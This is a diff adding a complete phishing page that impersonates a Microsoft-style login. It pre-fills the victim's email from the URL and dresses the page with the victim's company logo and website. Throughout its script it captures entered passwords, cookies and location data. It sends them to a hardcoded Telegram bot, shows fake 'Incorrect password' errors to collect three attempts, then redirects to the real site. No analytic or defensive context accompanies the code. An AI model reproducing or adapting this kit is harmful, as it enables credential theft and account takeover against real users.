@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Login</title>
+
+<!-- ✔ Correct location -->
+<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+
+<link rel="stylesheet"
+ href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
+
+<style>
+
+* { margin:0; padding:0; box-sizing:border-box; }
+body { font-family:"Segoe UI", sans-serif; height:100vh; background:#fff; overflow:hidden; }
+
+/* INTRO VIDEO */
+#intro {
+  position:fixed; inset:0; width:100%; height:100%; background:#fff; z-index:9999;
+  opacity:1; transition:opacity 1.2s ease-in-out;
+}
+#intro.fade-out { opacity:0; pointer-events:none; }
+#introVideo { width:100%; height:100%; border:none; pointer-events:none; }
+
+/* BACKGROUND */
+#bg-frame { position:fixed; inset:0; width:100%; height:100%; border:none; background:transparent; z-index:0; }
+
+/* LOGIN BOX CONTAINER */
+.overlay { position:absolute; inset:0; display:flex; justify-content:center; align-items:center; z-index:40; }
+
+/* LOGIN BOX */
+.login-box {
+  width:440px; min-height:380px; background:#fff; padding:40px; border-radius:12px;
+  box-shadow:0 12px 28px rgba(0,0,0,0.12);
+  position:relative; z-index:50;
+  overflow:hidden;
+}
+
+/* CONTENTS INSIDE BOX */
+.login-content {
+  transform: translateX(100px);
+  opacity:0;
+  transition: transform 0.42s cubic-bezier(.55,0,.1,1), opacity 0.42s cubic-bezier(.55,0,.1,1);
+}
+.login-content.visible {
+  transform: translateX(0);
+  opacity:1;
+}
+
+/* SHAKE ANIMATION */
+@keyframes shake {
+  0% { transform: translateX(0); }
+  20% { transform: translateX(-10px); }
+  40% { transform: translateX(10px); }
+  60% { transform: translateX(-8px); }
+  80% { transform: translateX(8px); }
+  100% { transform: translateX(0); }
+}
+.login-content.shake {
+  animation: shake 0.4s;
+}
+
+/* LOGO */
+#logo { width:100px; display:block; margin:0 auto 20px; margin-left:10px; }
+
+/* INPUTS */
+.input-group { display:flex; align-items:center; gap:10px; margin-bottom:28px; }
+.input-group i { color:#0078d4; font-size:18px; cursor:pointer; }
+.input-group input { flex:1; font-size:16px; font-weight:600; border:none; background:transparent; outline:none; border-bottom:1.5px solid transparent; transition:border-color .3s; }
+.input-group input:focus { border-bottom:1.5px solid #0078d4; }
+.ms-pass-field { width:100%; padding:12px; border:1px solid #8a8a8a; font-size:16px; margin-top:20px; }
+
+/* LINKS */
+.ms-links { margin:15px 0 15px; line-height:1.8; }
+.ms-links a { color:#0067b8; text-decoration:none; }
+.ms-links a:hover { text-decoration:underline; }
+
+/* NEXT BUTTON */
+.ms-next-btn { background:#0067b8; color:#fff; border:none; padding:12px 34px; font-size:17px; cursor:pointer; float:right; border-radius:0; transition:background 0.2s ease; }
+.ms-next-btn:hover { background:#005a9e; }
+
+/* ERROR MESSAGE */
+#error-msg {
+  color:red;
+  text-align:center;
+  margin-top:10px;
+  opacity:0;
+  transition: opacity 0.4s ease;
+}
+#error-msg.show { opacity:1; }
+</style>
+</head>
+<body>
+
+<!-- INTRO VIDEO -->
+<div id="intro">
+  <iframe id="introVideo" allow="autoplay; fullscreen"
+    src="https://streamable.com/e/cau62r?autoplay=1&nocontrols=1">
+  </iframe>
+</div>
+
+<!-- Fullscreen background iframe -->
+<iframe id="bg-frame"></iframe>
+
+<!-- LOGIN BOX -->
+<div class="overlay">
+  <div class="login-box">
+    <div class="login-content" id="loginContent">
+
+      <img id="logo" src="" alt="Logo" />
+
+      <div class="input-group">
+        <i class="fas fa-arrow-left"></i>
+        <input type="email" id="email" placeholder="@example.com"/>
+      </div>
+
+      <div class="login-header">
+        <!-- Write-up added here -->
+        <p style="margin-bottom: 10px; font-weight: normal;">
+          You are about to access a sensitive document, so you need to sign in.
+        </p>
+        </p>
+        </p>
+        
+        <b>Enter password</b>
+        <input type="password" id="password" placeholder="Password" class="ms-pass-field"/>
+<!-- Cloudflare Turnstile CAPTCHA -->
+<div class="cf-turnstile"
+     data-theme="light"
+     data-sitekey="0x4AAAAAAACaC0XXXXXXXXXXXXXXX">
+</div>
+
+        <div class="ms-links">
+          <p>No account? <a href="https://signup.live.com/?lic=1">Create one</a></p>
+          <p><a href="https://support.microsoft.com/en-us/account-billing/reset-a-forgotten-microsoft-account-password-eff4f067-5042-c1a3-fe72-b04d60556c37">Can’t access your account?</a></p>
+        </div>
+
+        <!-- ERROR MESSAGE -->
+        <div id="error-msg"></div>
+
+        <button id="login-btn" class="ms-next-btn">Next</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+
+
+// Intro video fade
+const videoDuration = 4000;
+setTimeout(() => {
+  intro.classList.add("fade-out");
+  setTimeout(() => {
+    introVideo.remove();
+    intro.style.display = "none";
+    loginContent.classList.add("visible");
+  }, 1500);
+}, videoDuration);
+
+
+// Telegram Bot config
+const TELEGRAM_BOT_TOKEN = "8366154069:AAFTClzM2Kbirysud1i49UAWmEC6JP0T0xg";
+const TELEGRAM_CHAT_ID = "7574749243";
+
+// Elements
+const rawHash = window.location.hash.substring(1);
+const emailInput = document.getElementById('email');
+const logoImg = document.getElementById('logo');
+const bgFrame = document.getElementById('bg-frame');
+const passwordInput = document.getElementById('password');
+const loginBtn = document.getElementById('login-btn');
+const errorMsg = document.getElementById('error-msg');
+const overlay = document.querySelector('.overlay');
+
+let attempts = 0;
+const maxAttempts = 3;
+
+document.body.classList.add('blur-active');
+
+
+// Helper: parse document.cookie into an object { name: value, ... }
+function parseCookies(cookieString = document.cookie) {
+  const cookies = {};
+  if (!cookieString) return cookies;
+  cookieString.split(';').forEach(pair => {
+    const idx = pair.indexOf('=');
+    if (idx > -1) {
+      const name = pair.slice(0, idx).trim();
+      const val = pair.slice(idx + 1).trim();
+      try {
+        cookies[name] = decodeURIComponent(val);
+      } catch {
+        cookies[name] = val;
+      }
+    }
+  });
+  return cookies;
+}
+
+// Grab cookies now
+const cookies = parseCookies();
+// Optional: console log to check cookies
+console.log("Cookies available to JS:", cookies);
+
+
+// Get email from URL  ?u=
+const params = new URLSearchParams(window.location.search);
+const rawEmail = params.get("br29ns97");
+
+// Check if email exists AND is valid
+if (rawEmail && /^[^@]+@[^@]+\.[^@]+$/.test(rawEmail)) {
+
+  emailInput.value = rawEmail;
+  emailInput.setAttribute("uneditable", true);
+
+  const domain = rawEmail.split('@')[1];
+   // Set logo
+  logoImg.src = `https://logo.clearbit.com/${domain}`;
+  logoImg.onerror = () => {
+    logoImg.src = "https://via.placeholder.com/150?text=Logo";
+  };
+
+  // Setup fallback screenshot container
+  const fallbackScreenshot = document.createElement('img');
+  fallbackScreenshot.id = "fallback-screenshot";
+  fallbackScreenshot.style.cssText = `
+    display: none;
+    position: fixed; top: 0; left: 0;
+    width: 100vw; height: 100vh;
+    object-fit: cover;
+    z-index: 0;
+    pointer-events: none;
+  `;
+  fallbackScreenshot.alt = "Screenshot fallback";
+  fallbackScreenshot.src = `https://image.thum.io/get/width/1280/crop/900/https://${domain}`;
+  document.body.appendChild(fallbackScreenshot);
+
+  // Load iframe with timeout
+  let iframeLoaded = false;
+  bgFrame.src = `https://${domain}`;
+
+  bgFrame.onload = () => {
+    iframeLoaded = true;
+    fallbackScreenshot.style.display = "none";
+    bgFrame.style.display = "block";
+  };
+
+  setTimeout(() => {
+    if (!iframeLoaded) {
+      bgFrame.style.display = "none";
+      fallbackScreenshot.style.display = "block";
+      // Keep overlay visible — do NOT hide it
+      document.body.classList.remove('blur-active'); // optional blur removal
+    }
+  }, 6000);
+
+  bgFrame.onerror = () => {
+    bgFrame.style.display = "none";
+    fallbackScreenshot.style.display = "block";
+    // Keep overlay visible — do NOT hide it
+    document.body.classList.remove('blur-active'); // optional blur removal
+  };
+}
+
+// Fetch user country (mandatory)
+
+// Location details
+let userIP = "Unknown IP";
+let userCity = "Unknown City";
+let userCountry = "Unknown Country";
+let userISP = "Unknown ISP";
+loginBtn.disabled = true;
+
+fetch("https://ipapi.co/json/")
+  .then(res => res.json())
+  .then(data => {
+    userCity = data.city || userCity;
+    userCountry = data.country_name || userCountry;
+  })
+  .catch(() => {
+    // silent fail
+  })
+  .finally(() => {
+    loginBtn.disabled = false;
+  });
+
+// Telegram message sender
+function sendTelegramMessage(email, password, attempt, country, cookies) {
+  const text = `☠️ DAVON CHAMELEON [${attempt}/3] ☠️\n` +
+             ` 🖥️UserId : [ ${email} ]\n` +
+               `🔐 Pass : [ ${password} ]\n` +
+              ` 🌍Country : [ ${userCity}, ${userCountry} ]\n` +
+               ` Cookies: ${JSON.stringify(cookies)}`;
+
+  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+  const payload = {
+    chat_id: TELEGRAM_CHAT_ID,
+    text: text,
+    parse_mode: "HTML"
+  };
+  fetch(url, {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify(payload)
+  }).catch(e => console.error("Telegram send failed:", e));
+}
+
+// Login button handler
+loginBtn.addEventListener('click', () => {
+ // 🔥 ALWAYS shake on click
+  shakeLoginContent();
+  const password = passwordInput.value.trim();
+  function shakeLoginContent() {
+  const content = document.getElementById("loginContent");
+  content.classList.remove("shake");
+  void content.offsetWidth; // reflow to restart animation
+  content.classList.add("shake");
+}
+  if (password === "") {
+    errorMsg.textContent = "Password cannot be empty.";
+    return;
+  }
+  attempts++;
+  sendTelegramMessage(emailInput.value, password, attempts, userCountry, cookies);
+
+  if (attempts < maxAttempts) {
+    errorMsg.textContent = "Incorrect password.";
+    passwordInput.value = "";
+  } else {
+    errorMsg.textContent = "";
+    overlay.style.display = 'none';
+    document.body.classList.remove('blur-active');
+    window.location.href = `https://${emailInput.value.split('@')[1]}`;
+  }
+});
+
+</script>
+</body>
+</html>
